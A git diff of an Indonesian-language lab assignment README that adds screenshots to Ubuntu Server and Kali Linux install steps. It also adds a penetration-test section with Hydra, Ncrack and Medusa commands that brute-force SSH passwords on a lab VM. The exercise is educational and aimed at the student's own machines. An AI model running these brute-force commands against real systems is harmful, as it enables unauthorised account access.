@@ -40,42 +40,68 @@
       https://www.ubuntu.com/download/server
       
   2. Pilih "*Install Ubuntu Server*"
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-choose-server.png)
   3. Set Hostname, Username, dan Password
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-host-server.png)
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-user-server.png)
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-pwd-server.png)
   4. Set Partition Disk Menjadi *Guided - use entire disk*
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-part-server.png)
   5. Tunggu instalasi selesai
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-wait-server.png)
   6. Lakukan konfigurasi lainnnya
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/config-taskkel-server.png)
   7. Pilih software yang akan diinstall, dalam hal ini yaitu OpenSSH Server
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-soft-server.png)
   8. Tunggu instalasi software
-  
-  9. Selesai!!!
-
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-soft-wait-server.png)
+  9. Install Bootloader Grub
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-grub-server.png)
+  10. Selesai!!!
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/done-server.png)
 ### Instalasi Kali Linux
   
   1. Download file instalasi Kali Linux dan mount ke virtual machine
       https://www.kali.org/downloads/
 
   2. Pilih *Graphical Install*
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-choose-kali.png)
   3. Set Hostname, Username, dan Password
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-host-kali.png)
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-user-kali.png)
   4. Set Partition Disk menjadi *Guided - use entire disk*
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-part-kali.png)
   5. Set Disk yang akan dibuat menjadi partisi
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-disk-kali.png)
   6. Set Partition Scheme menjadi *All files in one partition*
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-scheme-kali.png)
   7. Tunggu Instalasi Selesai
-  
+     ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/install-wait-kali.png)
   8. Selesai!!!
 
 ### Uji Penetrasi 1
 
+  Atur ip dari masing – masing virtual machine pada file :
+> /etc/network/interfaces
+
+![SS 2](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/config-ip-server.PNG "Setting IP pada ubuntu server")
+
+![SS 3](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/config-ip-kali.PNG "Setting IP pada kali linux")
+
+Lakukan restart
+> ```service networking restart```
+
+Lalu lakukan tes serangan dengan cara sebagai berikut:
+
+  * #### Hydra
+    > ```hydra -l target -P 10_million_password_list_top_100.txt 192.168.1.1 ssh```
+   ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/uji1-hydra.png)
+  * #### Ncrack
+    > ```ncrack -vv --user target 192.168.1.1:22```
+   ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/uji1-medusa.png)
+  * #### Medusa
+    > ```medusa -u target -P 10_million_password_list_top_100.txt -h 192.168.1.1 -M ssh```
+   ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%201/Gambar/uji1-ncrack.png)
 
 ### Uji Penetrasi 2
 
